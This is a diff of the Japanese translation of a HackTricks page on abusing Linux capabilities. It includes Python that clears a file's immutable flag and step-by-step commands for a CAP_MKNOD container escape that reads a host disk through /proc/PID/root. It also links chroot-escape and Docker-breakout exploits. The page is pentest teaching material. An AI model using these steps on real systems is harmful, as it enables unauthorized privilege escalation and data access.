+ファイルが immutable であり、python にこの capability がある場合、**immutable 属性を削除してファイルを変更可能にできます。**
 ```python
 #Check that the file is imutable
 lsattr file.sh
@@ -1430,23 +1397,27 @@ lsattr file.sh
 ```
 
 ```python
-#Pyhton code to allow modifications to the file
+# Python code to remove the immutable flag and allow modifications
 import fcntl
 import os
 import struct
 
-FS_APPEND_FL = 0x00000020
+FS_IMMUTABLE_FL = 0x00000010
+FS_IOC_GETFLAGS = 0x80086601
 FS_IOC_SETFLAGS = 0x40086602
 
 fd = os.open('/path/to/file.sh', os.O_RDONLY)
-f = struct.pack('i', FS_APPEND_FL)
-fcntl.ioctl(fd, FS_IOC_SETFLAGS, f)
+flags = struct.unpack('i', fcntl.ioctl(fd, FS_IOC_GETFLAGS, struct.pack('i', 0)))[0]
+fcntl.ioctl(fd, FS_IOC_SETFLAGS, struct.pack('i', flags & ~FS_IMMUTABLE_FL))
+os.close(fd)
 
-f=open("/path/to/file.sh",'a+')
+with open('/path/to/file.sh', 'a') as f:
 f.write('New content for the file\n')
 ```
+`FS_IOC_GETFLAGS` および `FS_IOC_SETFLAGS` 操作は inode フラグを読み取り、更新します。この例では、immutable フラグである `FS_IMMUTABLE_FL` をクリアします。<sup>[[27]](#references)</sup>
+
 > [!TIP]
-> 通常、この immutable attribute は以下を使用して設定および削除します:
+> 通常、この immutable 属性の設定と解除には以下を使用します。
 >
 > ```bash
 > sudo chattr +i file.txt
@@ -1455,44 +1426,44 @@ f.write('New content for the file\n')
 
 ## CAP_SYS_CHROOT
 
-[**CAP_SYS_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) は `chroot(2)` system call の実行を可能にします。これにより、既知の脆弱性を利用して `chroot(2)` environments から escape できる可能性があります:<sup>[[11]](#references)</sup>
+[**CAP_SYS_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) は `chroot(2)` system call の実行を可能にします。これにより、既知の脆弱性を介して `chroot(2)` environments から escape できる可能性があります。<sup>[[11]](#references)[[14]](#references)</sup>
 
-- [How to break out from various chroot solutions](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf)<sup>[[11]](#references)</sup>
+- [さまざまな chroot solutions から break out する方法](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf).<sup>[[11]](#references)</sup>
 - [chw00t: chroot escape tool](https://github.com/earthquake/chw00t/)
 
 ## CAP_SYS_BOOT
 
-[**CAP_SYS_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) は、system restart 用の `reboot(2)` system call の実行を可能にするだけでなく、特定の hardware platforms 向けに調整された `LINUX_REBOOT_CMD_RESTART2` などの specific commands も実行できます。また、新しい crash kernels または signed crash kernels をそれぞれロードするために、`kexec_load(2)` および Linux 3.17 以降では `kexec_file_load(2)` も使用できます。
+[**CAP_SYS_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) は system restart のための `reboot(2)` system call の実行を可能にします。これには `LINUX_REBOOT_CMD_RESTART2` などの commands が含まれます。また、新しい crash kernel または signed crash kernel をそれぞれ load するための `kexec_load(2)` と、Linux 3.17 以降では `kexec_file_load(2)` も有効にします。<sup>[[14]](#references)</sup>
 
 ## CAP_SYSLOG
 
-[**CAP_SYSLOG**](https://man7.org/linux/man-pages/man7/capabilities.7.html) は Linux 2.6.37 で、より広範な **CAP_SYS_ADMIN** から分離され、具体的には `syslog(2)` call を使用する権限を付与します。この capability により、`kptr_restrict` setting が 1 の場合に、`/proc` および類似の interfaces を通じて kernel addresses を表示できます。`kptr_restrict` は kernel addresses の公開範囲を制御します。Linux 2.6.39 以降、`kptr_restrict` の default は 0 です。つまり kernel addresses は公開されますが、security 上の理由から、多くの distributions はこれを 1 (uid 0 以外には addresses を隠す) または 2 (常に addresses を隠す) に設定しています。
+[**CAP_SYSLOG**](https://man7.org/linux/man-pages/man7/capabilities.7.html) は Linux 2.6.37 で、より広範な **CAP_SYS_ADMIN** から分離され、特に `syslog(2)` call を使用する権限を付与します。この capability は、kernel addresses の露出を制御する `kptr_restrict` setting が 1 の場合に、`/proc` および類似の interfaces を介して kernel addresses を表示できるようにします。Linux 2.6.39 以降、`kptr_restrict` の default は 0 です。これは kernel addresses が露出することを意味しますが、多くの distributions は security 上の理由から、1（uid 0 以外には addresses を隠す）または 2（常に addresses を隠す）に設定しています。<sup>[[14]](#references)</sup>
 
-さらに、`dmesg_restrict` が 1 に設定されている場合、**CAP_SYSLOG** により `dmesg` output にアクセスできます。これらの変更にもかかわらず、過去の経緯により、**CAP_SYS_ADMIN** は引き続き `syslog` operations を実行できます。
+さらに、`dmesg_restrict` が 1 に設定されている場合、**CAP_SYSLOG** は `dmesg` output への access を可能にします。これらの変更にもかかわらず、歴史的な経緯により **CAP_SYS_ADMIN** は `syslog` operations を実行する権限を保持しています。<sup>[[14]](#references)</sup>
 
 ## CAP_MKNOD
 
-[**CAP_MKNOD**](https://man7.org/linux/man-pages/man7/capabilities.7.html) は、通常の files、FIFOs (named pipes)、または UNIX domain sockets の作成にとどまらず、`mknod` system call の機能を拡張します。具体的には、以下を含む special files の作成を可能にします:
+[**CAP_MKNOD**](https://man7.org/linux/man-pages/man7/capabilities.7.html) は、通常の files、FIFO（named pipes）、または UNIX domain sockets の作成を超えて、`mknod` system call の functionality を拡張します。具体的には、以下を含む special files の作成を可能にします。<sup>[[14]](#references)</sup>
 
-- **S_IFCHR**: Character special files。terminals などの devices。
-- **S_IFBLK**: Block special files。disks などの devices。
+- **S_IFCHR**: terminals などの devices である character special files。
+- **S_IFBLK**: disks などの devices である block special files。
 
-この capability は、device files を作成する必要がある processes に不可欠であり、character または block devices を通じた hardware への直接 interaction を可能にします。
+この capability は、character devices または block devices を含む device files を作成する必要がある processes に有用です。<sup>[[14]](#references)</sup>
 
-これは default docker capability です ([https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19))。
+これは Docker の documented default capability set に含まれています。すべての deployment が同じ defaults を使用すると想定せず、実際の runtime configuration を確認してください（[Moby default capability list](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19)）。<sup>[[19]](#references)</sup>
 
-この capability により、以下の conditions 下で host 上の privilege escalations (full disk read による) が可能になります:<sup>[[7]](#references)</sup>
+この capability は、以下の条件下で host 上で privilege escalations（full disk read による）を可能にします。<sup>[[7]](#references)</sup>
 
-1. Host への initial access を持っている (Unprivileged)。
-2. Container への initial access を持っている (Privileged (EUID 0) かつ effective `CAP_MKNOD`)。
+1. Host への initial access がある（Unprivileged）。
+2. Container への initial access がある（Privileged（EUID 0）かつ effective `CAP_MKNOD`）。
 3. Host と container が同じ user namespace を共有している。
 
 **Container 内で Block Device を作成して Access する手順:**
 
 1. **Standard User として Host 上で:**
 
-- `id` を使用して current user ID を確認します。例: `uid=1000(standarduser)`。
-- Target device を特定します。例: `/dev/sdb`。
+- `id` を使用して現在の user ID を確認します（例: `uid=1000(standarduser)`）。
+- target device を特定します（例: `/dev/sdb`）。
 
 2. **`root` として Container 内で:**
 ```bash
@@ -1505,7 +1476,7 @@ useradd -u 1000 standarduser
 # Switch to the newly created user
 su standarduser
 ```
-3. **ホストに戻って:**
+3. **Hostに戻る:**
 ```bash
 # Locate the PID of the container process owned by "standarduser"
 # This is an illustrative example; actual command might vary
@@ -1514,36 +1485,41 @@ ps aux | grep -i container_name | grep -i standarduser
 # Access the container's filesystem and the special block device
 head /proc/12345/root/dev/sdb
 ```
-このアプローチにより、標準ユーザーは、共有 user namespace とデバイスに設定された権限を悪用し、container を介して `/dev/sdb` にアクセスし、場合によってはデータを読み取ることができます。
+このアプローチでは、デバイス、namespace、権限が説明どおりに設定されている場合、standard user は container を介して `/dev/sdb` にアクセスし、データを読み取れる可能性があります。<sup>[[7]](#references)</sup>
 
 ### CAP_SETPCAP
 
-**CAP_SETPCAP** は、ある process が別の process の **capability sets を変更**できるようにし、effective、inheritable、permitted sets への capability の追加または削除を可能にします。ただし、process が変更できるのは、自身の permitted set に保持している capability に限られるため、自身の権限を超えて別の process の権限を昇格させることはできません。最近の kernel の更新では、これらのルールが厳格化され、`CAP_SETPCAP` は自身または子孫の permitted sets 内の capability を減少させることだけに制限されています。これは security risks の軽減を目的としています。使用するには、effective set に `CAP_SETPCAP` があり、対象となる capability が permitted set に含まれている必要があります。変更には `capset()` を使用します。これは、privilege management と security enhancement における `CAP_SETPCAP` の中核的な機能と制限をまとめたものです。
+file capabilities が使用される現在の Linux kernel では、**`CAP_SETPCAP`** により、スレッドは bounding set から inheritable set に capabilities を追加し、bounding set から capabilities を削除し、securebits を変更できます。別のプロセスに任意の capabilities を付与することはできません。その動作が適用されるのは、file-capability のサポートがなかった 2.6.25 より前の kernel だけです。<sup>[[14]](#references)</sup>
 
-**`CAP_SETPCAP`** は、ある process が **別の process の capability sets を変更**できるようにする Linux capability です。別の process の effective、inheritable、permitted capability sets に対して、capability を追加または削除する機能を提供します。ただし、この capability の使用には一定の制限があります。
+`capset()` system call は、スレッド自身の effective、permitted、inheritable sets を調整できます。ただし、新しい permitted set に既存の permitted set 外の capabilities を含めることはできず、inheritable の更新にも kernel の制約が適用されます。<sup>[[14]](#references)</sup>
 
-`CAP_SETPCAP` を持つ process は、**自身の permitted capability set に含まれる capability だけを付与または削除できます**。つまり、ある process は、自身が保持していない capability を別の process に付与することはできません。この制限により、ある process が別の process の権限を、自身の権限レベルを超えて昇格させることを防止します。
+## References
 
-さらに、最近の kernel versions では、`CAP_SETPCAP` capability は **さらに制限**されています。process が他の process の capability sets を任意に変更することはできなくなりました。代わりに、**自身の permitted capability set、または自身の子孫の permitted capability set 内の capability を減少させることだけが可能**です。この変更は、capability に関連する潜在的な security risks を低減するために導入されました。
-
-`CAP_SETPCAP` を効果的に使用するには、effective capability set にこの capability があり、対象となる capability が permitted capability set に含まれている必要があります。その後、`capset()` system call を使用して、他の process の capability sets を変更できます。
-
-要約すると、`CAP_SETPCAP` により、ある process は他の process の capability sets を変更できますが、自身が保持していない capability を付与することはできません。さらに、security concerns により、最近の kernel versions では、その機能は自身の permitted capability set、または子孫の permitted capability sets 内の capability を減少させることだけに制限されています。
-
-## 参考資料
-
-- [1] [AttackDefense (Pentester Academy) - Linux capabilities privilege escalation labs](https://attackdefense.pentesteracademy.com)
-- [2] [Hacker's Grimoire - Privilege Escalation Linux](https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux)
+- [1] [AttackDefense (Pentester Academy) - Linux capabilities の privilege escalation labs](https://attackdefense.pentesteracademy.com)
+- [2] [Hacker's Grimoire - Linux の Privilege Escalation](https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux)
 - [3] [Linux Container Basics: Capabilities](https://www.schutzwerk.com/en/43/posts/linux_container_capabilities/)
 - [4] [Linux capabilities 101](https://linux-audit.com/linux-capabilities-101/)
-- [5] [Taking Advantage of Linux Capabilities](https://www.linuxjournal.com/article/5737)
-- [6] [Excessive Capabilities](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap_sys_module)
-- [7] [WithSecure Labs: Abusing the access to mount namespaces through /proc/pid/root](https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot)
-- [8] [Linux Capabilities: Why They Exist and How They Work](https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work)
-- [9] [Understanding Capabilities in Linux](https://blog.ploetzli.ch/2014/understanding-linux-capabilities/)
-- [10] [PoC for bypassing seccomp if ptrace is allowed](https://gist.github.com/thejh/8346f47e359adecd1d53)
-- [11] [How to break out from various chroot solutions](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf)
-- [12] [shocker.c - original CAP_DAC_READ_SEARCH Docker breakout exploit by Sebastian Krahmer](http://stealth.openwall.net/xSports/shocker.c)
-- [13] [Docker breakout exploit analysis](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3)
-
+- [5] [Linux Capabilities の活用](https://www.linuxjournal.com/article/5737)
+- [6] [過剰な Capabilities](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap_sys_module)
+- [7] [/proc/pid/root を介した mount namespaces へのアクセスの悪用](https://labs.reversec.com/posts/2020/06/abusing-access-to-mount-namespaces-through-procpidroot)
+- [8] [Linux Capabilities: 存在する理由と動作方法](https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work)
+- [9] [Linux における Capabilities の理解](https://blog.ploetzli.ch/2014/understanding-linux-capabilities/)
+- [10] [ptrace が許可されている場合に seccomp をバイパスする PoC](https://gist.github.com/thejh/8346f47e359adecd1d53)
+- [11] [さまざまな chroot ソリューションから脱出する方法](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf)
+- [12] [shocker.c - Sebastian Krahmer によるオリジナルの CAP_DAC_READ_SEARCH Docker breakout exploit](http://stealth.openwall.net/xSports/shocker.c)
+- [13] [Docker breakout exploit の分析](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3)
+- [14] [capabilities(7) - Linux の manual page](https://man7.org/linux/man-pages/man7/capabilities.7.html)
+- [15] [proc_pid_status(5) - Linux の manual page](https://man7.org/linux/man-pages/man5/proc_pid_status.5.html)
+- [16] [pam_cap(8) - Linux の manual page](https://man7.org/linux/man-pages/man8/pam_cap.8.html)
+- [17] [capability.conf(5) - Ubuntu Manpage](https://manpages.ubuntu.com/manpages/bionic/man5/capability.conf.5.html)
+- [18] [systemd.exec(5) - Linux の manual page](https://man7.org/linux/man-pages/man5/systemd.exec.5.html)
+- [19] [Running containers - Docker Docs](https://docs.docker.com/engine/containers/run/)
+- [20] [docker container run - Docker Docs](https://docs.docker.com/reference/cli/docker/container/run)
+- [21] [cap_text_formats(7) - Linux の manual page](https://man7.org/linux/man-pages/man7/cap_text_formats.7.html)
+- [22] [getpcaps(8) - Linux の manual page](https://man7.org/linux/man-pages/man8/getpcaps.8.html)
+- [23] [getcap(8) - Linux の manual page](https://man7.org/linux/man-pages/man8/getcap.8.html)
+- [24] [amicontained](https://github.com/genuinetools/amicontained)
+- [25] [setcap(8) - Linux の manual page](https://man7.org/linux/man-pages/man8/setcap.8.html)
+- [26] [capsh(1) - Linux の manual page](https://man7.org/linux/man-pages/man1/capsh.1.html)
+- [27] [ioctl_iflags(2) - Linux の manual page](https://man7.org/linux/man-pages/man2/ioctl_iflags.2.html)
 {{#include ../../banners/hacktricks-training.md}}
